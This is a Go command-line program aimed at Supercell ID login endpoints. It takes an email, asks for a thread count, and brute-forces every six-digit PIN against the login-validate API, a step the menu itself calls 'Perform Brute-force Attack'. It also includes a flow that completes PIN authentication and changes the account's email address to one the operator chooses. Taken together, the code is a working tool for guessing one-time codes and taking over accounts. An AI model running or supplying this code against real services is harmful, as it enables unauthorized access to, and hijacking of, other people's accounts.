package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/google/uuid"
)

type SupercellLoginRequestResponse struct {
	Ok    bool    `json:"ok"`
	Error *string `json:"error"`
}

type SupercellLoginValidateResponse struct {
	Ok    bool                        `json:"ok"`
	Error *string                     `json:"error"`
	Data  *SupercellLoginValidateData `json:"data"`
}

type SupercellLoginValidateData struct {
	Email       string                                `json:"email"`
	IsValid     bool                                  `json:"isValid"`
	IsBound     bool                                  `json:"isBound"`
	Application SupercellLoginValidateApplicationData `json:"application"`
	System      SupercellLoginValidateSystemData      `json:"system"`
}

type SupercellLoginValidateApplicationData struct {
	Application string   `json:"application"`
	Account     string   `json:"account"`
	Username    string   `json:"username"`
	Progress    []string `json:"progress"`
}

type SupercellLoginValidateSystemData struct {
	System   string   `json:"system"`
	Account  string   `json:"account"`
	Username string   `json:"username"`
	Progress []string `json:"progress"`
}

type SupercellLoginConfirmResponse struct {
	Ok    bool                         `json:"ok"`
	Data  *SupercellLoginConfirmResult `json:"data"`
	Error *string                      `json:"error"`
}

type SupercellLoginConfirmResult struct {
	Scid      string `json:"scid"`
	ScidToken string `json:"scidToken"`
	Email     string `json:"email"`
}

type SupercellPinAuthStartResponse struct {
	Ok    bool                         `json:"ok"`
	Data  *SupercellPinAuthStartResult `json:"data"`
	Error *string                      `json:"error"`
}

type SupercellPinAuthStartResult struct {
	Identifier SupercellPinAuthIdentifier `json:"identifier"`
	State      string                     `json:"state"`
}

type SupercellPinAuthIdentifier struct {
	Value string `json:"value"`
	Type  string `json:"type"`
}

type SupercellLoginSessionResponse struct {
	Ok    bool    `json:"ok"`
	Token *string `json:"token"`
	Error *string `json:"error"`
}

type SupercellPinAuthConfirmResponse struct {
	Ok    bool                           `json:"ok"`
	Data  *SupercellPinAuthConfirmResult `json:"data"`
	Error *string                        `json:"error"`
}

type SupercellPinAuthConfirmResult struct {
	Identifier     SupercellPinAuthIdentifier     `json:"identifier"`
	Authentication SupercellPinAuthAuthentication `json:"authentication"`
}

type SupercellPinAuthAuthentication struct {
	Token  string `json:"token"`
	Expiry int32  `json:"expiry"`
	Scope  string `json:"scope"`
}

type SupercellChangeIdentifierResponse struct {
	Ok    bool                             `json:"ok"`
	Data  *SupercellChangeIdentifierResult `json:"data"`
	Error *string                          `json:"error"`
}

type SupercellChangeIdentifierResult struct {
	NewIdentifier SupercellPinAuthIdentifier `json:"newIdentifier"`
}

type LoginResult struct {
	Success bool
	Error   error
}

func main() {
	writeLog("Initializing")

	writePreQuestion("Email : ")

	reader := bufio.NewReader(os.Stdin)
	email, _ := reader.ReadString('\n')
	email = strings.TrimSpace(email)

	data := "email=" + url.QueryEscape(email) + "&lang=en&remember=true&game=laser&env=prod"

	client := &http.Client{}

	req, err := http.NewRequest("POST", "https://id.supercell.com/api/ingame/account/login", bytes.NewReader([]byte(data)))

	if err != nil {
		panic(err)
	}

	uuid := strings.ToUpper(uuid.NewString())

	req.Header.Set("host", "id.supercell.com")
	req.Header.Set("content-type", "application/x-www-form-urlencoded")
	req.Header.Set("content-length", fmt.Sprintf("%d", len(data)))
	req.Header.Set("user-agent", "scid/4527-i (iOS 17.4.1; laser-prod; iPhone13,1)")
	req.Header.Set("x-supercell-device-id", uuid)

	resp, err := client.Do(req)

	if err != nil {
		panic(err)
	}

	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}

	if resp.StatusCode != 200 {
		writeError("Request Error (" + resp.Status + ") : " + string(body))
	}

	var response SupercellLoginRequestResponse

	if err := json.Unmarshal(body, &response); err != nil {
		panic(err)
	}

	if response.Ok {
		writeLog("Login request successful")

		writeLog("")
		writeLog("1. Manual Login")
		writeLog("2. Perform Brute-force Attack")
		writeLog("")

		writePreQuestion("> ")

		choice, err := reader.ReadString('\n')
		choice = strings.TrimSpace(choice)

		if err != nil {
			panic(err)
		}

		attemptLogin := func(code string) (bool, error) {
			data := "email=" + url.QueryEscape(email) + "&pin=" + code

			req, err := http.NewRequest("POST", "https://id.supercell.com/api/ingame/account/login.validate", bytes.NewReader([]byte(data)))

			if err != nil {
				return false, err
			}

			req.Header.Set("host", "id.supercell.com")
			req.Header.Set("content-type", "application/x-www-form-urlencoded")
			req.Header.Set("content-length", fmt.Sprintf("%d", len(data)))
			req.Header.Set("user-agent", "scid/4527-i (iOS 17.4.1; laser-prod; iPhone13,1)")
			req.Header.Set("x-supercell-device-id", uuid)

			resp, err = client.Do(req)

			if err != nil {
				return false, err
			}

			body, err := io.ReadAll(resp.Body)

			if err != nil {
				return false, err
			}

			if resp.StatusCode != 200 {
				return false, errors.New(string(body))
			}

			var response SupercellLoginValidateResponse
			if err := json.Unmarshal(body, &response); err != nil {
				panic(err)
			}

			if response.Ok {
				return true, nil
			}

			return false, errors.New(*response.Error)
		}

		confirmLogin := func(code string) (*SupercellLoginConfirmResult, error) {
			data := "email=" + url.QueryEscape(email) + "&pin=" + code

			req, err := http.NewRequest("POST", "https://id.supercell.com/api/ingame/account/login.confirm", bytes.NewReader([]byte(data)))

			if err != nil {
				return nil, err
			}

			req.Header.Set("host", "id.supercell.com")
			req.Header.Set("content-type", "application/x-www-form-urlencoded")
			req.Header.Set("content-length", fmt.Sprintf("%d", len(data)))
			req.Header.Set("user-agent", "scid/4527-i (iOS 17.4.1; laser-prod; iPhone13,1)")
			req.Header.Set("x-supercell-device-id", uuid)

			resp, err = client.Do(req)

			if err != nil {
				return nil, err
			}

			body, err := io.ReadAll(resp.Body)

			if err != nil {
				return nil, err
			}

			if resp.StatusCode != 200 {
				return nil, errors.New(string(body))
			}

			var response SupercellLoginConfirmResponse
			if err := json.Unmarshal(body, &response); err != nil {
				panic(err)
			}

			if response.Ok {
				return response.Data, nil
			}

			return nil, errors.New(*response.Error)
		}

		loginSession := func(token string) (string, error) {
			req, err := http.NewRequest("GET", "https://security.id.supercell.com/api/security/v1/sessionToken", bytes.NewReader([]byte("")))

			if err != nil {
				return "", err
			}

			req.Header.Set("host", "id.supercell.com")
			req.Header.Set("content-type", "application/x-www-form-urlencoded")
			req.Header.Set("user-agent", "scid/4527-i (iOS 17.4.1; laser-prod; iPhone13,1)")
			req.Header.Set("x-supercell-device-id", uuid)
			req.Header.Set("Authorization", "Bearer "+token)

			resp, err = client.Do(req)

			if err != nil {
				return "", err
			}

			body, err := io.ReadAll(resp.Body)

			if err != nil {
				return "", err
			}

			if resp.StatusCode != 200 {
				return "", errors.New(string(body))
			}

			var response SupercellLoginSessionResponse
			if err := json.Unmarshal(body, &response); err != nil {
				panic(err)
			}

			if response.Ok {
				return *response.Token, nil
			}

			return "", errors.New(*response.Error)
		}

		pinAuthStart := func(scope string, email string, token string) (*SupercellPinAuthStartResult, error) {
			data := "scope=" + url.QueryEscape(scope) + "&application=laser-prod&identifier=" + url.QueryEscape(email)

			req, err := http.NewRequest("POST", "https://id.supercell.com/api/account/v2/pinAuthentication.start", bytes.NewReader([]byte(data)))

			if err != nil {
				return nil, err
			}

			req.Header.Set("Authorization", "Bearer "+token)
			req.Header.Set("host", "id.supercell.com")
			req.Header.Set("content-type", "application/x-www-form-urlencoded")
			req.Header.Set("content-length", fmt.Sprintf("%d", len(data)))
			req.Header.Set("user-agent", "scid/4527-i (iOS 17.4.1; laser-prod; iPhone13,1)")
			req.Header.Set("x-supercell-device-id", uuid)

			resp, err = client.Do(req)

			if err != nil {
				return nil, err
			}

			body, err := io.ReadAll(resp.Body)

			if err != nil {
				return nil, err
			}

			if resp.StatusCode != 200 {
				return nil, errors.New(string(body))
			}

			var response SupercellPinAuthStartResponse
			if err := json.Unmarshal(body, &response); err != nil {
				panic(err)
			}

			if response.Ok {
				return response.Data, nil
			}

			return nil, errors.New(*response.Error)
		}

		submitPinAuth := func(state string, pin string, token string) (*SupercellPinAuthConfirmResult, error) {
			data := "state=" + url.QueryEscape(state) + "&code=" + pin

			req, err := http.NewRequest("POST", "https://id.supercell.com/api/account/v2/pinAuthentication.complete", bytes.NewReader([]byte(data)))

			if err != nil {
				return nil, err
			}

			req.Header.Set("host", "id.supercell.com")
			req.Header.Set("content-type", "application/x-www-form-urlencoded")
			req.Header.Set("content-length", fmt.Sprintf("%d", len(data)))
			req.Header.Set("user-agent", "scid/4527-i (iOS 17.4.1; laser-prod; iPhone13,1)")
			req.Header.Set("x-supercell-device-id", uuid)
			req.Header.Set("Authorization", "Bearer "+token)

			resp, err = client.Do(req)

			if err != nil {
				return nil, err
			}

			body, err := io.ReadAll(resp.Body)

			if err != nil {
				return nil, err
			}

			if resp.StatusCode != 200 {
				return nil, errors.New(string(body))
			}

			var response SupercellPinAuthConfirmResponse
			if err := json.Unmarshal(body, &response); err != nil {
				panic(err)
			}

			if response.Ok {
				return response.Data, nil
			}

			return nil, errors.New(*response.Error)
		}

		changeIdentify := func(pinToken string, newPinToken string) (*SupercellChangeIdentifierResult, error) {
			data := "identifierLinkAuthenticationToken=" + url.QueryEscape(pinToken) + "&identifierChangeAuthenticationToken=" + url.QueryEscape(newPinToken)

			req, err := http.NewRequest("POST", "https://id.supercell.com/api/account/v2/identifier.change", bytes.NewReader([]byte(data)))

			if err != nil {
				return nil, err
			}

			req.Header.Set("host", "id.supercell.com")
			req.Header.Set("content-type", "application/x-www-form-urlencoded")
			req.Header.Set("content-length", fmt.Sprintf("%d", len(data)))
			req.Header.Set("user-agent", "scid/4527-i (iOS 17.4.1; laser-prod; iPhone13,1)")
			req.Header.Set("x-supercell-device-id", uuid)

			resp, err = client.Do(req)

			if err != nil {
				return nil, err
			}

			body, err := io.ReadAll(resp.Body)

			if err != nil {
				return nil, err
			}

			if resp.StatusCode != 200 {
				return nil, errors.New(string(body))
			}

			var response SupercellChangeIdentifierResponse
			if err := json.Unmarshal(body, &response); err != nil {
				panic(err)
			}

			if response.Ok {
				return response.Data, nil
			}

			return nil, errors.New(*response.Error)
		}

		switch string(choice) {
		case "1":
			writeLog("You chose manual login.")
			writePreQuestion("Code : ")

			code, err := reader.ReadString('\n')

			if err != nil {
				panic(err)
			}

			success, err := attemptLogin(code)

			if err != nil {
				writeError("Login Error : " + err.Error())
				return
			}

			if success {
				writeLog("Successfully authenticated")
			}

			result, err := confirmLogin(code)

			if err != nil {
				writeError("Login confirm error : " + err.Error())
				return
			}

			writeLog("Scid : " + result.Scid)
			writeLog("Scid Token : " + result.ScidToken)

			token, err := loginSession(result.ScidToken)

			if err != nil {
				writeError("Session login error : " + err.Error())
				return
			}

			writeLog("Token : " + token)

			pinResult, err := pinAuthStart("account/identifier.change", email, token)

			state := pinResult.State

			writeLog("State : " + state)

			writePreQuestion("Code : ")

			_pinCode, err := reader.ReadString('\n')
			pinCode := strings.TrimSpace(_pinCode)

			confirmResult, err := submitPinAuth(state, pinCode, token)

			if err != nil {
				writeError("Pin Confirm Error : " + err.Error())
				return
			}

			pinToken := confirmResult.Authentication.Token

			writeLog("Pin Auth Token : " + pinToken)

			writePreQuestion("Enter New Mail : ")

			_newMail, err := reader.ReadString('\n')

			newMail := strings.TrimSpace(_newMail)

			newPinResult, err := pinAuthStart("account/identifier.link", newMail, token)

			if err != nil {
				writeError("New Pin Auth Start Error : " + err.Error())
				return
			}

			newState := newPinResult.State

			writeLog("New Pin Auth State : " + newState)

			writePreQuestion("New Pin Auth Code : ")

			_newCode, err := reader.ReadString('\n')
			newCode := strings.TrimSpace(_newCode)

			newConfirmResult, err := submitPinAuth(newState, newCode, token)

			if err != nil {
				writeError("New Pin Auth Confirm Error : " + err.Error())
				return
			}

			newPinToken := newConfirmResult.Authentication.Token

			writeLog("New Pin Token : " + newPinToken)

			writeLog("Changing Email Address...")

			newIden, err := changeIdentify(pinToken, newPinToken)

			if err != nil {
				writeError("Change Identify Error : " + err.Error())
				return
			}

			writeLog("Success : " + newIden.NewIdentifier.Value + " (" + newIden.NewIdentifier.Type + ")")

			return
		case "2":
			writeLog("You chose brute-force attack.")

			writePreQuestion("Threads : ")

			_threads, err := reader.ReadString('\n')

			if err != nil {
				panic(err)
			}

			_threads = strings.TrimSpace(_threads)

			threads, err := strconv.Atoi(_threads)

			if err != nil {
				panic(err)
			}

			var current int32 = 0

			otp := make(chan string)
			ctx, cancel := context.WithCancel(context.Background())
			defer cancel()

			var wg sync.WaitGroup

			for i := 0; i < threads; i++ {
				go func(code string) {
					defer wg.Done()
					for {
						select {
						case <-ctx.Done():
							return
						default:
							code := fmt.Sprintf("%06d", atomic.AddInt32(&current, 1)-1)
							success, err := attemptLogin(code)
							if err != nil {
								writeError("Error : " + err.Error() + " (" + code + ")")
								continue
							}
							if success {
								otp <- code
								cancel()
								return
							}
						}
					}
				}(fmt.Sprintf("%06d", current))
				current++
			}

			select {
			case code := <-otp:
				writeLog("Received OTP : " + code)
			case <-ctx.Done():
				writeLog("No successful login attempt was completed.")
			}

			break
		default:
			writeError("Invalid option.")
			break
		}
	} else {
		writeError("Login request failed : " + *response.Error)
	}
}

func writePreQuestion(question string) {
	fmt.Printf("\033[38;2;223;223;223m[%s]\033[0m \033[38;2;69;69;69m%s\033[0m", time.Now().Format("3:04:05 PM"), question)
}

func writeError(log string) {
	fmt.Printf("\033[38;2;206;59;33m[%s]\033[0m \033[38;2;69;69;69m%s\033[0m\n", time.Now().Format("3:04:05 PM"), log)
}

func writeLog(log string) {
	fmt.Printf("\033[38;2;223;223;223m[%s]\033[0m \033[38;2;69;69;69m%s\033[0m\n", time.Now().Format("3:04:05 PM"), log)
}
